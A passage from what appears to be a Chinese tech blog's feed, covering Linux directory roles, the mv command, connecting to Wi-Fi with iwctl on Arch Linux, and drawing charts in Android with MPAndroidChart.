下都有自己独立的目录。例如：<code>/home/username</code> 是用户名为 <code>username</code> 的用户的主目录。</li></ul><h4 id="7-lib-和-lib64"><a href="#7-lib-和-lib64" class="headerlink" title="7. /lib 和 /lib64"></a>7. <code>/lib</code> 和 <code>/lib64</code></h4><ul><li><strong>系统库文件</strong>存放目录，主要存储用于支持 <code>/bin</code> 和 <code>/sbin</code> 中的基本命令的共享库。</li><li><code>/lib64</code> 目录专门为 64 位库文件设计。</li></ul><h4 id="8-media-和-mnt"><a href="#8-media-和-mnt" class="headerlink" title="8. /media 和 /mnt"></a>8. <code>/media</code> 和 <code>/mnt</code></h4><ul><li><p>挂载点</p><p>：</p><ul><li><code>/media</code> 目录通常用于自动挂载的设备，如 USB 设备或 CD/DVD。</li><li><code>/mnt</code> 通常用于临时挂载的文件系统。</li></ul></li></ul><h4 id="9-opt"><a href="#9-opt" class="headerlink" title="9. /opt"></a>9. <code>/opt</code></h4><ul><li><strong>可选软件包目录</strong>，用于存放那些第三方软件的可选文件。一般是一些大型的、非标准的软件包。</li></ul><h4 id="10-proc"><a href="#10-proc" class="headerlink" title="10. /proc"></a>10. <code>/proc</code></h4><ul><li><strong>内核和进程信息</strong>的虚拟文件系统，包含系统内核、进程、内存等信息。文件内容是动态生成的，例如：<code>/proc/cpuinfo</code> 包含 CPU 信息。</li></ul><h4 id="11-root"><a href="#11-root" class="headerlink" title="11. /root"></a>11. <code>/root</code></h4><ul><li><strong>root 用户的主目录</strong>，超级用户的专属主目录，普通用户无权访问。</li></ul><h4 id="12-run"><a href="#12-run" class="headerlink" title="12. /run"></a>12. <code>/run</code></h4><ul><li><strong>系统运行时的临时文件</strong>，用于存放系统进程启动时所需的临时文件和进程间的通信文件。</li></ul><h4 id="13-sbin"><a href="#13-sbin" class="headerlink" title="13. /sbin"></a>13. <code>/sbin</code></h4><ul><li><strong>系统管理命令</strong>，类似于 <code>/bin</code>，但主要用于系统管理员执行的命令，例如：<code>reboot</code>, <code>shutdown</code> 等。</li></ul><h4 id="14-srv"><a href="#14-srv" class="headerlink" title="14. /srv"></a>14. <code>/srv</code></h4><ul><li><strong>服务数据目录</strong>，用于存放由系统提供的服务（如 Web 服务器、FTP 服务器）的数据。例如：Web 服务器的文档根目录可能在 <code>/srv/http</code>。</li></ul><h4 id="15-sys"><a href="#15-sys" class="headerlink" title="15. /sys"></a>15. <code>/sys</code></h4><ul><li><strong>系统设备的虚拟文件系统</strong>，类似于 <code>/proc</code>，用于反映设备与内核之间的关系。</li></ul><h4 id="16-tmp"><a href="#16-tmp" class="headerlink" title="16. /tmp"></a>16. <code>/tmp</code></h4><ul><li><strong>临时文件目录</strong>，用于存储各种临时文件，系统和应用程序的临时文件通常都保存在此目录。系统重启时该目录会被清空。</li></ul><h4 id="17-usr"><a href="#17-usr" class="headerlink" title="17. /usr"></a>17. <code>/usr</code></h4><ul><li><p>用户二级目录</p><p>，包含系统程序和库文件的集合。它包括了多个子目录：</p><ul><li><code>/usr/bin</code>: 用户应用程序。</li><li><code>/usr/sbin</code>: 系统管理程序。</li><li><code>/usr/lib</code>: 应用程序的库文件。</li><li><code>/usr/share</code>: 存放共享数据，如文档、手册等。</li></ul></li></ul><h4 id="18-var"><a href="#18-var" class="headerlink" title="18. /var"></a>18. <code>/var</code></h4><ul><li><p>可变数据文件</p><p>，如日志文件、缓存、软件包管理器的数据库等都会存储在此。例如：</p><ul><li><code>/var/log</code>: 系统日志文件。</li><li><code>/var/cache</code>: 缓存文件。</li><li><code>/var/lib</code>: 应用程序状态数据。</li></ul></li></ul><hr><p>这个目录结构遵循 Linux 的标准，并通过合理分配功能使系统更加模块化和易于管理。理解这些目录的功能有助于更好地使用和管理 Arch Linux 系统。</p><h3 id="mv-命令的用法简介"><a href="#mv-命令的用法简介" class="headerlink" title="mv 命令的用法简介"></a><code>mv</code> 命令的用法简介</h3><p><code>mv</code> 命令是 Linux 系统中用于<strong>移动文件或目录</strong>，以及<strong>重命名文件或目录</strong>的命令。其基本语法如下：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> [选项] 源文件 目标位置</span><br></pre></td></tr></tbody></table></figure><h4 id="1-移动文件"><a href="#1-移动文件" class="headerlink" title="1. 移动文件"></a>1. <strong>移动文件</strong></h4><ul><li><p>基本用法：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> 源文件 目标目录</span><br></pre></td></tr></tbody></table></figure><ul><li><p>例子：将文件 </p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">file.txt</span><br></pre></td></tr></tbody></table></figure><p> 移动到 </p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/home/user/</span><br></pre></td></tr></tbody></table></figure><p> 目录下：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> file.txt /home/user/</span><br></pre></td></tr></tbody></table></figure></li></ul></li></ul><h4 id="2-重命名文件"><a href="#2-重命名文件" class="headerlink" title="2. 重命名文件"></a>2. <strong>重命名文件</strong></h4><ul><li><p>基本用法：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mv 旧文件名 新文件名</span><br></pre></td></tr></tbody></table></figure><ul><li><p>例子：将 </p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">oldname.txt</span><br></pre></td></tr></tbody></table></figure><p> 重命名为 </p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">newname.txt</span><br></pre></td></tr></tbody></table></figure><p>：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> oldname.txt newname.txt</span><br></pre></td></tr></tbody></table></figure></li></ul></li></ul><h4 id="3-移动并重命名文件"><a href="#3-移动并重命名文件" class="headerlink" title="3. 移动并重命名文件"></a>3. <strong>移动并重命名文件</strong></h4><ul><li><p>你可以同时移动和重命名文件：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> oldname.txt /home/user/newname.txt</span><br></pre></td></tr></tbody></table></figure><p>该命令将 </p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">oldname.txt</span><br></pre></td></tr></tbody></table></figure><p> 文件移动到 </p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/home/user/</span><br></pre></td></tr></tbody></table></figure><p> 目录并重命名为 </p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">newname.txt</span><br></pre></td></tr></tbody></table></figure><p>。</p></li></ul><h4 id="4-移动目录"><a href="#4-移动目录" class="headerlink" title="4. 移动目录"></a>4. <strong>移动目录</strong></h4><ul><li><p>基本用法：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> 源目录 目标目录</span><br></pre></td></tr></tbody></table></figure><ul><li><p>例子：将目录 </p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">folder1</span><br></pre></td></tr></tbody></table></figure><p> 移动到 </p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/home/user/</span><br></pre></td></tr></tbody></table></figure><p> 目录：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> folder1 /home/user/</span><br></pre></td></tr></tbody></table></figure></li></ul></li></ul><h4 id="5-常用选项"><a href="#5-常用选项" class="headerlink" title="5. 常用选项"></a>5. <strong>常用选项</strong></h4><ul><li><p><code>-i</code>：<strong>提示覆盖</strong>。如果目标文件已存在，使用此选项将提示是否覆盖文件。</p><ul><li><p>例子：移动文件时提示是否覆盖：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> -i file.txt /home/user/</span><br></pre></td></tr></tbody></table></figure></li></ul></li><li><p><code>-f</code>：<strong>强制覆盖</strong>。默认覆盖目标文件，不提示确认（<code>-f</code> 是默认行为）。</p><ul><li><p>例子：强制覆盖已存在的文件：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> -f file.txt /home/user/</span><br></pre></td></tr></tbody></table></figure></li></ul></li><li><p><code>-n</code>：<strong>不覆盖</strong>。如果目标文件已存在，不进行任何操作，也不会提示用户。</p><ul><li><p>例子：不覆盖已存在的文件：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> -n file.txt /home/user/</span><br></pre></td></tr></tbody></table></figure></li></ul></li><li><p><code>-v</code>：<strong>显示详细信息</strong>。显示每个移动或重命名操作的详细过程。</p><ul><li><p>例子：显示移动文件的详细信息：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> -v file.txt /home/user/</span><br></pre></td></tr></tbody></table></figure></li></ul></li></ul><h4 id="6-示例"><a href="#6-示例" class="headerlink" title="6. 示例"></a>6. <strong>示例</strong></h4><ul><li><p><strong>将多个文件移动到一个目录：</strong></p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> file1.txt file2.txt file3.txt /home/user/</span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>将整个目录（包含文件和子目录）移动到另一个位置：</strong></p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> /path/to/source_directory /path/to/destination/</span><br></pre></td></tr></tbody></table></figure></li></ul><h4 id="7-注意事项"><a href="#7-注意事项" class="headerlink" title="7. 注意事项"></a>7. <strong>注意事项</strong></h4><ul><li>如果目标目录已存在，<code>mv</code> 会将文件移动到该目录中。</li><li>如果目标文件已存在且没有使用 <code>-i</code> 或 <code>-n</code> 选项，<code>mv</code> 会直接覆盖目标文件。</li></ul><h3 id="iwctl-使用指南"><a href="#iwctl-使用指南" class="headerlink" title="iwctl 使用指南"></a><code>iwctl</code> 使用指南</h3><p><code>iwctl</code> 是 iNet Wireless Daemon (IWD) 的一个命令行工具，专用于管理 Linux 系统中的 Wi-Fi 连接。它适用于轻量级、简洁的网络管理需求，特别是 Arch Linux 等发行版。</p><h4 id="1-安装和启动-iwd"><a href="#1-安装和启动-iwd" class="headerlink" title="1. 安装和启动 iwd"></a>1. <strong>安装和启动 <code>iwd</code></strong></h4><ul><li><p>安装 <code>iwd</code>：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S iwd</span><br></pre></td></tr></tbody></table></figure></li><li><p>启动 <code>iwd</code> 服务：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl start iwd</span><br></pre></td></tr></tbody></table></figure></li><li><p>设置 <code>iwd</code> 随系统启动：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> iwd</span><br></pre></td></tr></tbody></table></figure></li></ul><h4 id="2-进入-iwctl-交互模式"><a href="#2-进入-iwctl-交互模式" class="headerlink" title="2. 进入 iwctl 交互模式"></a>2. <strong>进入 <code>iwctl</code> 交互模式</strong></h4><p>在终端中输入以下命令进入 <code>iwctl</code> 交互模式：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">iwctl</span><br></pre></td></tr></tbody></table></figure><p>进入交互模式后，后续的命令都将在此模式下运行。</p><h4 id="3-查看网络设备"><a href="#3-查看网络设备" class="headerlink" title="3. 查看网络设备"></a>3. <strong>查看网络设备</strong></h4><ul><li><p>使用以下命令列出所有无线网络设备：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">device list</span><br></pre></td></tr></tbody></table></figure></li><li><p>输出示例：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">Devices:</span><br><span class="line">  Name          Address            Powered   Adapter   Mode</span><br><span class="line">  wlan0         xx:xx:xx:xx:xx:xx  on        phy0      station</span><br></pre></td></tr></tbody></table></figure></li><li><p><code>wlan0</code> 是网络接口名，后续步骤中会用到它。</p></li></ul><h4 id="4-扫描可用-Wi-Fi-网络"><a href="#4-扫描可用-Wi-Fi-网络" class="headerlink" title="4. 扫描可用 Wi-Fi 网络"></a>4. <strong>扫描可用 Wi-Fi 网络</strong></h4><ul><li><p>在指定设备上扫描 Wi-Fi 网络：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">station wlan0 scan</span><br></pre></td></tr></tbody></table></figure></li><li><p>等待扫描完成后，使用以下命令列出所有可用的 Wi-Fi 网络：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">station wlan0 get-networks</span><br></pre></td></tr></tbody></table></figure></li><li><p>输出示例：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">Available networks:</span><br><span class="line">  SSID                Security</span><br><span class="line">  MyHomeWiFi          psk</span><br><span class="line">  OpenNetwork         open</span><br></pre></td></tr></tbody></table></figure></li></ul><h4 id="5-连接到-Wi-Fi-网络"><a href="#5-连接到-Wi-Fi-网络" class="headerlink" title="5. 连接到 Wi-Fi 网络"></a>5. <strong>连接到 Wi-Fi 网络</strong></h4><ul><li><p>连接到一个指定的 Wi-Fi 网络（例如 </p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">MyHomeWiFi</span><br></pre></td></tr></tbody></table></figure><p>）：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">station wlan0 connect MyHomeWiFi</span><br></pre></td></tr></tbody></table></figure></li><li><p>如果 Wi-Fi 网络需要密码，系统会提示你输入密码。</p></li><li><p>成功连接后，你会看到类似以下的输出：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">Connected to MyHomeWiFi</span><br></pre></td></tr></tbody></table></figure></li></ul><h4 id="6-断开-Wi-Fi-网络"><a href="#6-断开-Wi-Fi-网络" class="headerlink" title="6. 断开 Wi-Fi 网络"></a>6. <strong>断开 Wi-Fi 网络</strong></h4><ul><li><p>如果你想断开 Wi-Fi 连接，可以使用以下命令：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">station wlan0 disconnect</span><br></pre></td></tr></tbody></table></figure></li></ul><h4 id="7-显示当前连接状态"><a href="#7-显示当前连接状态" class="headerlink" title="7. 显示当前连接状态"></a>7. <strong>显示当前连接状态</strong></h4><ul><li><p>查看当前的连接状态，包括 IP 地址、SSID 等信息：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">station wlan0 show</span><br></pre></td></tr></tbody></table></figure></li></ul><h4 id="8-列出保存的-Wi-Fi-配置"><a href="#8-列出保存的-Wi-Fi-配置" class="headerlink" title="8. 列出保存的 Wi-Fi 配置"></a>8. <strong>列出保存的 Wi-Fi 配置</strong></h4><ul><li><p>显示系统中保存的 Wi-Fi 网络配置：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">known-networks list</span><br></pre></td></tr></tbody></table></figure></li></ul><h4 id="9-删除保存的-Wi-Fi-配置"><a href="#9-删除保存的-Wi-Fi-配置" class="headerlink" title="9. 删除保存的 Wi-Fi 配置"></a>9. <strong>删除保存的 Wi-Fi 配置</strong></h4><ul><li><p>删除某个保存的 Wi-Fi 网络配置（例如 </p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">MyHomeWiFi</span><br></pre></td></tr></tbody></table></figure><p>）：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">known-networks remove MyHomeWiFi</span><br></pre></td></tr></tbody></table></figure></li></ul><h4 id="10-退出-iwctl"><a href="#10-退出-iwctl" class="headerlink" title="10. 退出 iwctl"></a>10. <strong>退出 <code>iwctl</code></strong></h4><p>完成操作后，可以输入以下命令退出 <code>iwctl</code> 交互模式：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></tbody></table></figure><hr><h3 id="示例操作流程（完整流程）："><a href="#示例操作流程（完整流程）：" class="headerlink" title="示例操作流程（完整流程）："></a>示例操作流程（完整流程）：</h3><ol><li><p><strong>启动 <code>iwd</code> 服务：</strong></p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl start iwd</span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>进入 <code>iwctl</code>：</strong></p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">iwctl</span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>查看网络设备：</strong></p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">device list</span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>扫描 Wi-Fi 网络：</strong></p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">station wlan0 scan</span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>显示扫描结果：</strong></p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">station wlan0 get-networks</span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>连接到指定 Wi-Fi 网络：</strong></p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">station wlan0 connect MyHomeWiFi</span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>显示当前连接状态：</strong></p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">station wlan0 show</span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>退出 <code>iwctl</code>：</strong></p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></tbody></table></figure></li></ol><hr><h3 id="常用命令列表"><a href="#常用命令列表" class="headerlink" title="常用命令列表"></a>常用命令列表</h3><table><thead><tr><th>功能</th><th>命令</th></tr></thead><tbody><tr><td>启动 <code>iwd</code> 服务</td><td><code>sudo systemctl start iwd</code></td></tr><tr><td>启用开机自启 <code>iwd</code> 服务</td><td><code>sudo systemctl enable iwd</code></td></tr><tr><td>进入 <code>iwctl</code> 交互模式</td><td><code>iwctl</code></td></tr><tr><td>列出网络设备</td><td><code>device list</code></td></tr><tr><td>扫描 Wi-Fi 网络</td><td><code>station wlan0 scan</code></td></tr><tr><td>显示扫描结果</td><td><code>station wlan0 get-networks</code></td></tr><tr><td>连接 Wi-Fi 网络</td><td><code>station wlan0 connect SSID</code></td></tr><tr><td>断开 Wi-Fi 连接</td><td><code>station wlan0 disconnect</code></td></tr><tr><td>查看当前连接状态</td><td><code>station wlan0 show</code></td></tr><tr><td>列出保存的网络配置</td><td><code>known-networks list</code></td></tr><tr><td>删除保存的网络配置</td><td><code>known-networks remove SSID</code></td></tr><tr><td>退出 <code>iwctl</code></td><td><code>exit</code></td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android studio开发MPAndroidChart实现数据图表化</title>
      <link href="/NANABLOG/2024/09/20/Android-studio%E5%BC%80%E5%8F%91MPAndroidChart%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E5%8C%96/"/>
      <url>/NANABLOG/2024/09/20/Android-studio%E5%BC%80%E5%8F%91MPAndroidChart%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%9B%BE%E8%A1%A8%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h3 id="MPAndroidChart简介"><a href="#MPAndroidChart简介" class="headerlink" title="MPAndroidChart简介"></a>MPAndroidChart简介</h3><p><strong>MPAndroidChart</strong> 是一个强大且灵活的开源图表库，用于在 Android 应用程序中绘制各种类型的图表。它支持多种图表类型，包括：</p><ul><li><strong>折线图（Line Chart）</strong></li><li><strong>柱状图（Bar Chart）</strong></li><li><strong>饼图（Pie Chart）</strong></li><li><strong>散点图（Scatter Chart）</strong></li><li><strong>雷达图（Radar Chart）</strong></li><li><strong>K线图（Candle Stick Chart）</strong></li></ul><p>这个库的设计理念是简化数据可视化的过程，使开发者可以轻松地将美观的图表集成到他们的应用程序中。</p><h3 id="如何在-Android-Studio-中使用-MPAndroidChart"><a href="#如何在-Android-Studio-中使用-MPAndroidChart" class="headerlink" title="如何在 Android Studio 中使用 MPAndroidChart"></a>如何在 Android Studio 中使用 MPAndroidChart</h3><p>以下是如何在 Android Studio 项目中使用 MPAndroidChart 的详细步骤：</p><h4 id="1-添加依赖项"><a href="#1-添加依赖项" class="headerlink" title="1. 添加依赖项"></a>1. 添加依赖项</h4><p>首先，你需要将 MPAndroidChart 库添加到你的项目中。在 <code>build.gradle</code> 文件中（通常是项目的 <code>app</code> 模块），添加以下行到 <code>dependencies</code> 部分：</p><figure class="highlight groovy"><table><tbody><tr><td class="code"><pre><span class="line">dependencies {</span><br><span class="line">    implementation <span class="string">'com.github.PhilJay:MPAndroidChart:v3.0.2'</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>保存文件后，点击 Android Studio 顶部的 “Sync Now” 按钮，以同步 Gradle 依赖项。</p><h4 id="2-在布局文件中添加图表"><a href="#2-在布局文件中添加图表" class="headerlink" title="2. 在布局文件中添加图表"></a>2. 在布局文件中添加图表</h4><p>在你希望显示图表的 XML 布局文件中，添加相应的图表组件。例如，如果你想添加一个折线图，可以这样写：</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">com.github.mikephil.charting.charts.LineChart</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/lineChart"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"300dp"</span> /&gt;</span></span><br></pre></td></tr></tbody></table></figure><h4 id="3-在-Activity-或-Fragment-中初始化图表"><a href="#3-在-Activity-或-Fragment-中初始化图表" class="headerlink" title="3. 在 Activity 或 Fragment 中初始化图表"></a>3. 在 Activity 或 Fragment 中初始化图表</h4><p>在你的活动（Activity）或片段（Fragment）中，获取对图表的引用并设置数据。以下是一个简单的示例：</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> com.github.mikephil.charting.charts.LineChart;</span><br><span class="line"><span class="keyword">import</span> com.github.mikephil.charting.data.Entry;</span><br><span class="line"><span class="keyword">import</span> com.github.mikephil.charting.data.LineData;</span><br><span class="line"><span class="keyword">import</span> com.github.mikephil.charting.data.LineDataSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> LineChart lineChart;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> {</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        lineChart = findViewById(R.id.lineChart);</span><br><span class="line">        setupChart();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setupChart</span><span class="params">()</span> {</span><br><span class="line">        ArrayList&lt;Entry&gt; entries = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加数据点</span></span><br><span class="line">        entries.add(<span class="keyword">new</span> <span class="title class_">Entry</span>(<span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line">        entries.add(<span class="keyword">new</span> <span class="title class_">Entry</span>(<span class="number">1</span>, <span class="number">3</span>));</span><br><span class="line">        entries.add(<span class="keyword">new</span> <span class="title class_">Entry</span>(<span class="number">2</span>, <span class="number">2</span>));</span><br><span class="line">        entries.add(<span class="keyword">new</span> <span class="title class_">Entry</span>(<span class="number">3</span>, <span class="number">5</span>));</span><br><span class="line">        entries.add(<span class="keyword">new</span> <span class="title class_">Entry</span>(<span class="number">4</span>, <span class="number">4</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建数据集</span></span><br><span class="line">        <span class="type">LineDataSet</span> <span class="variable">dataSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LineDataSet</span>(entries, <span class="string">"频率数据"</span>);</span><br><span class="line">        dataSet.setColor(getResources().getColor(android.R.color.holo_blue_light));</span><br><span class="line">        dataSet.setValueTextColor(getResources().getColor(android.R.color.black));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 LineData 对象</span></span><br><span class="line">        <span class="type">LineData</span> <span class="variable">lineData</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LineData</span>(dataSet);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置数据到图表</span></span><br><span class="line">        lineChart.setData(lineData);</span><br><span class="line">        lineChart.invalidate(); <span class="comment">// 刷新图表显示</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="4-配置图表样式和外观"><a href="#4-配置图表样式和外观" class="headerlink" title="4. 配置图表样式和外观"></a>4. 配置图表样式和外观</h4><p>MPAndroidChart 提供了大量的方法来配置图表的外观，比如设置描述、轴线、网格线等。你可以使用以下代码进行一些基本的配置：</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">lineChart.getDescription().setEnabled(<span class="literal">false</span>); <span class="comment">// 禁用描述</span></span><br><span class="line">lineChart.getXAxis().setDrawGridLines(<span class="literal">false</span>); <span class="comment">// 不显示 X 轴网格线</span></span><br><span class="line">lineChart.getAxisLeft().setDrawGridLines(<span class="literal">true</span>); <span class="comment">// 显示 Y 轴网格线</span></span><br><span class="line">lineChart.getAxisRight().setEnabled(<span class="literal">false</span>); <span class="comment">// 禁用右侧 Y 轴</span></span><br><span class="line">lineChart.getLegend().setEnabled(<span class="literal">true</span>); <span class="comment">// 显示图例</span></span><br></pre></td></tr></tbody></table></figure><h3 id="图表类型"><a href="#图表类型" class="headerlink" title="图表类型"></a>图表类型</h3><ol><li><p><strong>BarChart</strong>:</p><ul><li>用于绘制条形图，可以用于展示分类数据的比较。</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">BarChart barChart;</span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>PieChart</strong>:</p><ul><li>用于绘制饼图，适合展示比例和百分比。</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">PieChart pieChart;</span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>RadarChart</strong>:</p><ul><li>用于绘制雷达图，适合展示多维数据。</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">RadarChart radarChart;</span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>ScatterChart</strong>:</p><ul><li>用于绘制散点图，可以显示数据集中的每一个点。</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ScatterChart scatterChart;</span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>BubbleChart</strong>:</p><ul><li>用于绘制气泡图，每个气泡代表一个数据点，气泡的大小可表示额外的信息。</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">BubbleChart bubbleChart;</span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>CandleStickChart</strong>:</p><ul><li>用于绘制蜡烛图，常用于金融数据的展示。</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">CandleStickChart candleStickChart;</span><br></pre></td></tr></tbody></table></figure></li></ol><h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3><p>每种图表的使用方法类似，你只需创建相应的图表类实例，并进行相应的配置和数据绑定。</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 创建一个 BarChart 实例</span></span><br><span class="line"><span class="type">BarChart</span> <span class="variable">barChart</span> <span class="operator">=</span> findViewById(R.id.barChart);</span><br><span class="line"><span class="comment">// 设置数据和其他配置...</span></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android studio开发使用NanoHTTPD实现java HTTP服务器</title>
      <link href="/NANABLOG/2024/09/19/Android-studio%E5%BC%80%E5%8F%91%E4%BD%BF%E7%94%A8NanoHTTPD%E5%AE%9E%E7%8E%B0java-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/NANABLOG/2024/09/19/Android-studio%E5%BC%80%E5%8F%91%E4%BD%BF%E7%94%A8NanoHTTPD%E5%AE%9E%E7%8E%B0java-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
